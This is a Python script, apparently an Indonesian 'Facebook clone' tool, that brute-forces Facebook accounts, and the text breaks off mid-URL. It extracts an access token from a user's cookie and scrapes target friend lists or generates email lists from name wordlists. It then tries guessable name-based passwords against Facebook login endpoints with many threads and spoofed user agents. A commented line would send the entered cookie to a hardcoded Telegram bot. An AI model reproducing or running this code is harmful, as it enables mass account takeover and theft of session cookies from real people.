""" source with ---( TEAM XNX )--- """
#__________________IMPORT____________#
import os,sys,rich,bs4,json,re,random,requests,time,datetime
try:
	from time import sleep
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
	os.system('pip install rich')
	os.system('pip install requests')
	os.system('pip install bs4')
#__________________ COLOR __________________#
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________ LOOP __________________
pwpluss,pwnya,dump,id,id2,tokenku,method,loop,ok,cp=[],[],[],[],[],[],[],0,0,0
rc = random.choice
rr = random.randint
#__________________ LINE __________________#
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
	os.system(f'clear')
	print(logo)
#__________________ SAVE OK CP __________________#
bulane = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tanggal = datetime.datetime.now().day
bulan = bulane[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
okc = 'OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
cpc = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
#__________________ USER AGENT __________________#
def api():
	rr = random.randint
	rc = random.choice
	versi = random.choice(["pt-BR","id","en"])
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	mmk = f"Mozilla/5.0 (Linux; U; Viera; {versi}) AppleWebKit/537.36 (KHTML, like Gecko) Viera/4.0.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(70,200))} Safari/537.36 SmartTV"
	mm1 = f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,150))}.0.{str(rr(2000,6000))}.{str(rr(25,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast)"
	return random.choice([ua1,ua2,ua3,ua4,ua5,mmk,mm1])
#__________________ LOGO KONTOL __________________#
logo=(f"""
{G1}╔╗╔╔═╗╔╗╔╔═╗  ╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗
{X5}║║║║ ║║║║╠═╣  ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ║ ║╠╦╝║  ║╣
{S}╝╚╝╚═╝╝╚╝╩ ╩  ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝╩╚═╚═╝╚═╝
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{A} Author   : {R}NonaXafier
{G1}[{A}≈{G1}]{A} Facebook : {X1}Nona Xafier
{G1}[{A}≈{G1}]{A} Github   : {B}NonaDev41
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________ CEK COOKIE # __________________#
ses = requests.Session()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			Main(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(f' \x1b[1;97m Your Internet Connection is Disconnected')
			exit()
	except IOError:
		login_lagi334()
#__________________ CEK COOKIES __________________#
def login_lagi334():
	os.system('clear')
	cok = input(f' {B} Login Your Cookies : {X4}')
#	(cookie steal alert) requests.post(f'https://api.telegram.org/bot6918382904:AAHSBLj5sfHdQvm5qzezu3e97W_1CwFmh3Q/sendMessage?chat_id=-1001990426052&text={cok}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> \x1b[1;91mcookie kamu invalid / ganti cookie lain !!!');time.sleep(2);batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n{A} Your Token : {S}{took}')
				exit()
	except Exception as e:
		print(e)
#__________________ MAIN MENU __________________#
def Main(id,name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(f'{G1}[{B}!{G1} Your Cookies Expired')
		time.sleep(2)
		login_lagi334()
	clear()
	print(f'{G1}[{A}1{G1}]{S} Publik Clone ')
	print(f'{G1}[{A}2{G1}]{S} FILE CLONE ')
	print(f'{G1}[{A}3{G1}]{B} RANDOM CLONE ')
	print(f'{G1}[{A}4{G1}]{X} CONTACT OWNER ')
	print(f'{G1}[{A}0{G1}]{R} EXIT TOOL ')
	linex()
	sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
	if sex in ['1']:
		clear()
		idt = input(f'{S}[{G3}>{S}] Target Uid : {X3}')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif sex in ['2','02']:File()
	elif sex in ['3','03']:Random()
	elif sex in ['4','04']:Author()
	elif sex in ['0','00']:exit()
	else:login()
#__________________ DUMP PUBLIK __________________#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#__________________ RANDOM DEF __________________#
def Random():
	clear()
	print(f'{G1}[{A}1{G1}]{S} Gmail Clone ')
	print(f'{G1}[{A}2{G1}]{G1} Yahoo Clone ')
	print(f'{G1}[{A}3{G1}]{B} Username FB Clone ')
	print(f'{G1}[{A}0{G1}]{R} EXIT TOOL ')
	random = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
	if random in ['1','01']:Gmail()
	elif random in ['2','02']:Yahoo()
	elif random in ['3','03']:Username()
	else:exit()
#__________________ YAHOO CLONE __________________#
def Yahoo():
	dump=[]
	clear()
	print(f'{A}[{S}>{A}] Gunakan {B}Nama {A}Depan Saja')
	print(f'{A}[{S}>{A}] Gunakan Tanda {R}({X5},{R}){A} Untuk Pemisah Nama')
	linex()
	tengah = ['handayani','ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah','marlina','adit','aditya','ahmad','arip','ardi','anto','agus','azis','ajis','apep','arya','aryo','asep','beni','beben','bang','boni','badru','badrus','cahyo','diki','dika','andika','deden','dadan','dudung','dadang','didin','dimas','doni','dafa','dedi','dudi','elan','elang','angga','anggi','edi','fasha','firman','fatir','fatah','fazri','fikri','engkus','endang','galih','galuh','galang','gilang','aldi','alpin','gagan','haris','hari','heri','herul','iwan','idan','idun','idin','fajar','jejen','jejee','jordi','joni','jajang','oji ','fauzi','putra','feri','padil','ari','hendi','eded','rendi','randi','roni','riski','rizki','risky','rizky','riki','rifki','ilham','hasan','rifan','teten','ade','ucup','udin','wili','andi','yayan','yana','yono','yanto','bili','azim','arlin','alin','anita','anisa','andin','andini','araa','citra','cinta','cicin','cici','cicih','desi','desti','dewi','dwi','destika','deswita','delin','delina','diniyah','dini','dina','dani','eci','esih','ela','elin','enci','erni','erna','empit','fitri','fifit','fina','ilah','ina','indah','inem','ida','iis','jani','kesya','kania','kaka','kiki','lala','loli','lesti','manda','amanda','mawar','entin','nana','nasya','nesya','nazwa','nanda','nandita','nadia','nadin','nandita','nuri','aida','aini','ninis','ndah','putri','puput','mutia','nur','resti','risya','rina','rini','ririn','rida','dila','adel','amel','mela','adelia','sifa','syifa','sinta','sintia','sindi','sinar','soleh','sodik','sindi','sindy','septi','sonia','senia','senny','seli','serli','serly','fatma','tia','tika','titin','cucu','cecep','widia','widi','widya','delia','wina','wiwi','wiwit','wika','riska','hesti','aulia','andri','aulia','yani','yuni','yeni','yeyen','lasma','zahra','zahwa','cahya','kekey','keke','lia','dahlia','denis','siti','wulan','herlina','lina','lani','leni','deti','dela']
	global ok , cc
	nama = input(f'\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Nama Depan : ').split(',')
	linex()
	if 'KANJUT' in str(nama):
		print(f'{A} Masukan Nama Depan Saja, {R}Jangan Kosong')
		linex()
		time.sleep(3);exit()
	doma = '@yahoo.com'
	jumlah = input(f'{A} Input Limit : {S}')
	for xyz in range(int(jumlah)):
		AA = rc(nama)
		II = f'{str(rr(0,1000))}'
		BB = f'{str(rc(tengah))}'
		CC = doma
		DD = f'{AA}{BB}{II}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+rc(nama))
		if len(dump)==999999:setting()
	setting()
#__________________ GMAIL CLONE __________________#
def Gmail():
	dump=[]
	clear()
	print(f'{A}[{S}>{A}] Gunakan {B}Nama {A}Depan Saja')
	print(f'{A}[{S}>{A}] Gunakan Tanda {R}({X5},{R}){A} Untuk Pemisah Nama')
	linex()
	tengah = ['handayani','ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah','marlina','adit','aditya','ahmad','arip','ardi','anto','agus','azis','ajis','apep','arya','aryo','asep','beni','beben','bang','boni','badru','badrus','cahyo','diki','dika','andika','deden','dadan','dudung','dadang','didin','dimas','doni','dafa','dedi','dudi','elan','elang','angga','anggi','edi','fasha','firman','fatir','fatah','fazri','fikri','engkus','endang','galih','galuh','galang','gilang','aldi','alpin','gagan','haris','hari','heri','herul','iwan','idan','idun','idin','fajar','jejen','jejee','jordi','joni','jajang','oji ','fauzi','putra','feri','padil','ari','hendi','eded','rendi','randi','roni','riski','rizki','risky','rizky','riki','rifki','ilham','hasan','rifan','teten','ade','ucup','udin','wili','andi','yayan','yana','yono','yanto','bili','azim','arlin','alin','anita','anisa','andin','andini','araa','citra','cinta','cicin','cici','cicih','desi','desti','dewi','dwi','destika','deswita','delin','delina','diniyah','dini','dina','dani','eci','esih','ela','elin','enci','erni','erna','empit','fitri','fifit','fina','ilah','ina','indah','inem','ida','iis','jani','kesya','kania','kaka','kiki','lala','loli','lesti','manda','amanda','mawar','entin','nana','nasya','nesya','nazwa','nanda','nandita','nadia','nadin','nandita','nuri','aida','aini','ninis','ndah','putri','puput','mutia','nur','resti','risya','rina','rini','ririn','rida','dila','adel','amel','mela','adelia','sifa','syifa','sinta','sintia','sindi','sinar','soleh','sodik','sindi','sindy','septi','sonia','senia','senny','seli','serli','serly','fatma','tia','tika','titin','cucu','cecep','widia','widi','widya','delia','wina','wiwi','wiwit','wika','riska','hesti','aulia','andri','aulia','yani','yuni','yeni','yeyen','lasma','zahra','zahwa','cahya','kekey','keke','lia','dahlia','denis','siti','wulan','herlina','lina','lani','leni','deti','dela']
	global ok , cc
	nama = input(f'\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Nama Depan : ').split(',')
	linex()
	if 'KANJUT' in str(nama):
		print(f'{A} Masukan Nama Depan Saja, {R}Jangan Kosong')
		linex()
		time.sleep(3);exit()
	doma = '@gmail.com'
	jumlah = input(f'{A} Input Limit : {S}')
	for xyz in range(int(jumlah)):
		AA = rc(nama)
		II = f'{str(rr(0,1000))}'
		BB = f'{str(rc(tengah))}'
		CC = doma
		DD = f'{AA}{BB}{II}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+rc(nama))
		if len(dump)==999999:setting()
	setting()
#__________________ USERNAME CLONE __________________#
def Username():
	dump=[]
	clear()
	print(f'{A}[{S}>{A}] Gunakan {B}Nama {A}Depan Saja')
	print(f'{A}[{S}>{A}] Gunakan Tanda {R}({X5},{R}){A} Untuk Pemisah Nama')
	linex()
	tengah = ['handayani','ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah','marlina','adit','aditya','ahmad','arip','ardi','anto','agus','azis','ajis','apep','arya','aryo','asep','beni','beben','bang','boni','badru','badrus','cahyo','diki','dika','andika','deden','dadan','dudung','dadang','didin','dimas','doni','dafa','dedi','dudi','elan','elang','angga','anggi','edi','fasha','firman','fatir','fatah','fazri','fikri','engkus','endang','galih','galuh','galang','gilang','aldi','alpin','gagan','haris','hari','heri','herul','iwan','idan','idun','idin','fajar','jejen','jejee','jordi','joni','jajang','oji ','fauzi','putra','feri','padil','ari','hendi','eded','rendi','randi','roni','riski','rizki','risky','rizky','riki','rifki','ilham','hasan','rifan','teten','ade','ucup','udin','wili','andi','yayan','yana','yono','yanto','bili','azim','arlin','alin','anita','anisa','andin','andini','araa','citra','cinta','cicin','cici','cicih','desi','desti','dewi','dwi','destika','deswita','delin','delina','diniyah','dini','dina','dani','eci','esih','ela','elin','enci','erni','erna','empit','fitri','fifit','fina','ilah','ina','indah','inem','ida','iis','jani','kesya','kania','kaka','kiki','lala','loli','lesti','manda','amanda','mawar','entin','nana','nasya','nesya','nazwa','nanda','nandita','nadia','nadin','nandita','nuri','aida','aini','ninis','ndah','putri','puput','mutia','nur','resti','risya','rina','rini','ririn','rida','dila','adel','amel','mela','adelia','sifa','syifa','sinta','sintia','sindi','sinar','soleh','sodik','sindi','sindy','septi','sonia','senia','senny','seli','serli','serly','fatma','tia','tika','titin','cucu','cecep','widia','widi','widya','delia','wina','wiwi','wiwit','wika','riska','hesti','aulia','andri','aulia','yani','yuni','yeni','yeyen','lasma','zahra','zahwa','cahya','kekey','keke','lia','dahlia','denis','siti','wulan','herlina','lina','lani','leni','deti','dela']
	global ok , cc
	nama = input(f'\x1b[1;97m[\x1b[1;92m>\x1b[1;97m] Nama Depan : ').split(',')
	linex()
	if 'KANJUT' in str(nama):
		print(f'{A} Masukan Nama Depan Saja, {R}Jangan Kosong')
		linex()
		time.sleep(3);exit()
	doma = '.'
	jumlah = input(f'{A} Input Limit : {S}')
	for xyz in range(int(jumlah)):
		AA = rc(nama)
		II = f'{str(rr(1,999))}'
		BB = f'{str(rc(tengah))}'
		CC = doma
		DD = f'{AA}{CC}{BB}{CC}{II}'
		if DD in id:pass
		else:id.append(DD+'|'+rc(nama))
		if len(dump)==999999:setting()
	setting()
#__________________ FILE CLONE __________________#
def File():
	try:
		clear()
		print(f'{A}[{S}>{A}] Masukan File Contoh {S}[{X5}>{S}] {G1}/sdcard/namafile.txt')
		linex()
		fileX = input (f'{A}[{S}>{A}] File Path : {G3}')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		exit(f"{S}[{R}!{S}] Input File Yang Benar")
		sleep(2);login()
#__________________ SETTING DEF __________________#
def setting():
	clear()
	print(f'{A}[{X1}?{A}] Setting Your Ids Account ')
	linex()
	print(f'{A}[{S}1{A}] Old Ids Account')
	print(f'{A}[{S}2{A}] New Ids Account')
	print(f'{A}[{S}3{A}] Random Ids Account')
	linex()
	ids = random = input(f'{G1}[{A}?{G1}]{A} Ids Select : {X2}')
	if ids in ['1','01']:
		for tua in sorted(id):
			id2.append(tua) 
	elif ids in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif ids in ['3','03']:
		for bacot in id:
			xx = rr(0,len(id2))
			id2.insert(xx,bacot)
#__________________ SETTING URL METHOD __________________#
	clear()
	print(f'{A}[{X1}?{A}] Setting Your Method Url ')
	linex()
	print(f'{A}[{S}1{A}] m.facebook.com')
	print(f'{A}[{S}2{A}] mbasic.facebook.com')
	print(f'{A}[{S}3{A}] free.facebook.com')
	metode = random = input(f'{G1}[{A}?{G1}]{A} Method Select : {X2}')
	linex()
	if metode in ['1','01']:
		method.append('mobile')
	elif metode in ['2','02']:
		method.append('mbasic')
	elif metode in ['3','03']:
		method.append('free')
	else:
		print(f'{A}[{S}•{A}] {X2}Pilihan Tidak Ada DiMenu Setting');timesleep(2);exit()
#__________________ SETTING PASSWORD MANUAL __________________#
	clear()
	print(f'{A}[{X1}?{A}] Password Add Manual')
	linex()
	print(f'{A}[{X1}?{A}] Ingin Menambahkan Password Manual {G1}y{A}/{R}t')
	passcode = input(f'{A}[{S}•{A}] Choice : {S}')
	if passcode in ['Y','y']:
		pwpluss.append('ya')
		pwku = input(f'{A}[{S}?{A}] Input Password : {S}')
		pwkuh = pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	setting_password()
# __________________ WORDLIST PASSWORD __________________#
def setting_password():
	clear()
	print(f'{A}[{S}•{A}] Total Ids Account Collect {S}> {A}{str(len(id))}')
	print(f'{A}[{S}•{A}] Mainkan Mode {G1}Pesawat{A} Setiap {B}500{A} Ids')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = [frs+'123',frs+'12345']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'12')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'12')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(asyin,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(validate,idf,pwv)
			elif 'free' in method:
				pool.submit(freefb,idf,pwv)
			else:
				pool.submit(asyin,idf,pwv)
				
def asyin(idf,pwv):
	global loop,ok,cp
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	md = random.choice([G2,A,B,R,M,X,X5,G3,A,S,B,Y,X5,G2,G5,A,S,B,Y,R])
	rd = random.choice([G2,A,B,R,M,X,X5,G3,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r{rd}NONA-M1{A}|{dm}{loop}{A}|{md}{len(id)}{A}|{rd}OK-{ok}{A}|{dm}CP-{cp}")
	sys.stdout.flush()
	ua = api()
	ses = requests.Session()
	for pw in pwv:
		try: 
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1663534280540672&kid_directed_site=0&app_id=1663534280540672&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D1663534280540672%26auth_type%26cbt%3D1707300145639%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd779066dd5b40b99%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%26client_id%3D1663534280540672%26display%3Dtouch%26domain%3Dwww.joox.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.joox.com%252Fid%252Flogin%26locale%3Den_US%26logger_id%3Dfeb763709d5e8b032%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcc815e62c9dea3d8%2526domain%253Dwww.joox.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.joox.com%25252Ffe5c1e614950497cf%2526relation%253Dopener%2526frame%253Df50e05a96e3646380%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv2.3%26re